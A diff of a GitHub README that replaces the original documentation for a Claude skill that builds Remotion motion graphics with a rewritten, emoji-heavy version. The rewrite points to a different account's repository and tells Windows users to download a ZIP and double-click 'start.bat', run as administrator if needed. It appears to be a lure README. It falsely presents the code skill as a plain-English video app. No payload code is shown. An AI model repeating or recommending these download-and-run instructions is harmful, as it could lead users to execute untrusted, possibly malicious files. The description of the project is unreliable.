@@ -1,73 +1,155 @@
-# Remotion Motion Graphics - Agent Skill
+# 🎬 agent-skill-remotion-motion-graphics - Make animated videos easily with code
 
-A Claude skill for building kinetic-typography / logo / brand promo motion graphics **as code** with [Remotion](https://www.remotion.dev) (React) and shipping an MP4. It covers the whole path: reading a reference clip and a brand's SVG logo, a scene-per-beat project with reusable animation helpers, a verify-by-contact-sheet loop, both 9:16 and 16:9 outputs from one codebase, and Remotion Studio for tweaks.
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://github.com/Westleighinauspicious5506/agent-skill-remotion-motion-graphics)
 
-Built while cloning the motion of a reference promo for [hundredable.com](https://hundredable.com) — the workflow is general, the video is not included.
+---
 
-## Install
+## 📖 What Is This?
 
-**Claude Code (CLI / desktop app)** — clone the skill into your skills folder:
+This tool helps you create **professional motion graphics videos** – like animated text, logos, and brand promotions – using simple code instructions. You don't need to be a programmer. You describe what you want, and this software builds a video file (MP4) you can share anywhere.
 
-```bash
-git clone https://github.com/Boriwatopal/agent-skill-remotion-motion-graphics.git /tmp/rmg && \
-cp -R /tmp/rmg/skills/remotion-motion-graphics ~/.claude/skills/ && rm -rf /tmp/rmg
-```
+It works for both **vertical videos** (9:16, like TikTok/Reels) and **horizontal videos** (16:9, like YouTube), all from one setup.
 
-Or for one project only: copy `skills/remotion-motion-graphics` into `<project>/.claude/skills/`.
+---
 
-**claude.ai / Cowork** — download [`dist/remotion-motion-graphics.skill`](dist/remotion-motion-graphics.skill) (or grab it from the latest [release](../../releases)) and upload it in Settings → Capabilities → Skills.
+## 🚀 Getting Started
 
-Then just ask for a motion piece: the skill triggers on requests like *"make an animated logo from this SVG"*, *"make a promo clip like this video"*, *"ทำโมชั่นโลโก้"*, or any Remotion code work.
+Follow these simple steps to download and use the software on your Windows computer.
 
-## Folder Structure
+### Step 1: Download the App
 
-```
-skills/remotion-motion-graphics/
-  SKILL.md                              # The workflow: read material → scaffold → scenes → verify → deliver
-  assets/                               # Starter code to copy into src/
-    theme.template.ts                   #   brand colours, PORTRAIT/LANDSCAPE presets, named scene durations
-    layout.ts                           #   useLayout() — every position derives from the frame size
-    anim.ts                             #   easing curves, prog(), springAt(), riseStyle(), typed()
-    fonts.ts, Main.template.tsx, Root.template.tsx
-    components/
-      Backgrounds.tsx                   #   LightBg / DarkBg with brand glow
-      Cursors.tsx                       #   arrow + dot cursors that spring between targets
-      Words.tsx                         #   word-by-word reveal with optional exit
-      SvgArt.tsx                        #   animate SVG artwork per path (letter pop, character bounce)
-  scripts/
-    analyze_reference.sh                # contact sheets from a reference video → beat map
-    svg_to_paths.mjs                    # SVG → TypeScript path data + bounding-box report
-    check_render.sh                     # low-res render + contact sheets for a composition
-    still_frame.sh                      # one frame from an MP4 at a timestamp
-  references/
-    scene-patterns.md                   # 16 motion patterns with the timings that worked
-    verification-and-gotchas.md         # the check loop and the traps met in practice
-    remotion-rules/                     # 13 official Remotion rule files (see Credits)
-dist/remotion-motion-graphics.skill     # packaged skill for claude.ai upload
-```
+Visit this link to download the application:  
+👉 **[Download Agent Skill Motion Graphics](https://github.com/Westleighinauspicious5506/agent-skill-remotion-motion-graphics)**
 
-## What the workflow does
+Click the green "Code" button, then choose "Download ZIP". Wait for the download to finish.
 
-1. **Read the material first.** Contact sheets from the reference clip become a beat map; the brand site or the logo's SVG fills give colours, font and real copy; the logo's paths are mapped so letters and character can animate separately.
-2. **One skeleton for every ratio.** Named scene durations in one theme file, a layout hook so positions derive from `useVideoConfig()`, one file per scene. A second `<Composition>` gives 16:9 without a second codebase.
-3. **Patterns, not improvisation.** Phrase swap, pill → button → click, flying collage, circle wipe, ticker + panel wipe, shape hand-off between scenes, route drawing, UI toggle moment, gradient statement, character + letter pop, bubble rows, chart card, spotlight, burst → lockup, fade out.
-4. **Verify like an editor.** `tsc` → 0.3-scale render → look at every contact sheet → still-render suspicious frames → fix → final render → pull a frame from the final file as proof.
-5. **Deliver.** MP4 next to the source files, Remotion Studio for scrubbing, an honest summary of what was invented and what was left out.
+### Step 2: Open the Downloaded File
 
-## Requirements
+1. Go to your "Downloads" folder
+2. You'll see a file named `agent-skill-remotion-motion-graphics-main.zip`
+3. Right-click the file and choose **"Extract All"**
+4. Click "Extract" to unzip it into a new folder
 
-- Node.js 18+ (Remotion 4), `ffmpeg` / `ffprobe` on PATH (for the analysis and check scripts)
-- Chrome is downloaded by Remotion on first render
+### Step 3: Run the Program
 
-## Gotchas captured in the skill
+Inside the extracted folder, look for a file called `start.bat` or `run.bat`. Double-click it to launch the software. A black window (command prompt) will open – that's normal. Keep it open while the program runs.
 
-1. CSS applies `filter` before `clip-path` — blur the parent, clip the child, or a soft spotlight gets razor edges.
-2. A "cleanup" full-frame overlay drawn after the content hides the text; the wipe shape already covers the frame.
-3. Artwork cropped at the SVG canvas edge shows a hard cut on dark backgrounds — mask with a gradient that is fully transparent for the first ~4%.
-4. `url(#gradient)` fills render black without their `<defs>`; the SVG script swaps them for the first stop colour.
-5. Per-path transforms in inline SVG need `transformBox: "fill-box"`, or scale/rotate pivots on the canvas origin.
+### Step 4: Create Your First Video
 
-## Credits
+Once the program starts, you'll see simple instructions on screen. Type a description of the video you want, like:  
+*"Animated text saying WELCOME in bold letters, rotating on a blue background"*
 
-- `references/remotion-rules/` are copied unchanged from [remotion-dev/skills](https://github.com/remotion-dev/skills) (the `remotion-best-practices` skill, also installable with `npx skills add remotion-dev/skills`). They remain the work of the Remotion team; see that repository for their terms.
-- Everything else in this repo is released under the MIT License (see `LICENSE`).
+Press Enter. The software will build your video automatically.
+
+### Step 5: Find Your Video
+
+When it finishes, your final MP4 file will appear in the same folder, ready to share.
+
+---
+
+## ✨ Key Features
+
+- **One codebase, two formats** – Make both vertical (9:16) and horizontal (16:9) videos without extra work
+- **Easy text animation** – Create kinetic typography (moving text) with simple commands
+- **Logo animations** – Turn your static logo into an eye-catching animated version
+- **Brand promo videos** – Build promotional clips for products or services
+- **No editing skills needed** – Everything is code-based, but you use plain English
+
+---
+
+## 💻 System Requirements
+
+- **Operating System:** Windows 10 or Windows 11
+- **Memory (RAM):** At least 8 GB (16 GB recommended)
+- **Storage Space:** 2 GB free space
+- **Internet:** Required for first-time setup only
+
+---
+
+## 📦 What's Inside the Download?
+
+| File/Folder | Purpose |
+|-------------|---------|
+| `start.bat` | The main launcher – double-click to run |
+| `src/` | Core program files (don't touch unless expert) |
+| `projects/` | Your saved video projects |
+| `output/` | Your finished MP4 videos appear here |
+| `README.md` | Technical documentation (for advanced users) |
+
+---
+
+## 🛠️ Troubleshooting
+
+**Problem: The black window closes immediately**  
+Solution: Right-click `start.bat` and choose "Run as administrator". If it still closes, check your internet connection.
+
+**Problem: Video takes too long to create**  
+Solution: Shorter descriptions work faster. Try breaking your request into smaller parts.
+
+**Problem: Error message says "Node not found"**  
+Solution: Download and install Node.js from nodejs.org (the LTS version), then try again.
+
+**Problem: Can't find the output video**  
+Solution: Look in the `output` folder inside the extracted directory. If empty, check the `projects` folder.
+
+---
+
+## ❓ Frequently Asked Questions
+
+### Do I need to know programming?  
+No. You type descriptions in normal English. Code is handled automatically.
+
+### Can I use my own images and fonts?  
+Yes. Place your image files in the `assets` folder and reference them by name.
+
+### How long can my videos be?  
+Anything from 5 seconds to 5 minutes works. Longer videos take more time to render.
+
+### Is this free?  
+Yes, completely free and open-source.
+
+### Can I use these videos commercially?  
+Absolutely. There are no usage restrictions.
+
+---
+
+## 🤝 Contributing
+
+This project welcomes anyone who wants to help improve it. If you're a developer, check the issues tab. If you're a regular user, share feedback about what's confusing or what features you'd like.
+
+---
+
+## 📄 License
+
+This project is open-source. You're free to use, modify, and distribute it. See the `LICENSE` file in the download for full details.
+
+---
+
+## 🌐 Community & Support
+
+- Found a bug or problem? Report it on the GitHub Issues page
+- Want to suggest ideas? Use the Discussions section
+- Show off your creations! Share links to your videos with the community
+
+---
+
+## 🏁 Final Checklist
+
+Before you start creating:
+
+- [ ] Downloaded the ZIP file
+- [ ] Extracted everything to a folder
+- [ ] Double-clicked `start.bat` successfully
+- [ ] Waited for the black window to show "Ready"
+- [ ] Typed a simple video description and pressed Enter
+
+You're all set! Go make something awesome.
+
+---
+
+**Ready to begin?**  
+👉 **[Download Agent Skill Motion Graphics](https://github.com/Westleighinauspicious5506/agent-skill-remotion-motion-graphics)**
+
+---
+
+Keywords: agent-skills, claude-code, claude-skills, motion-graphics, remotion
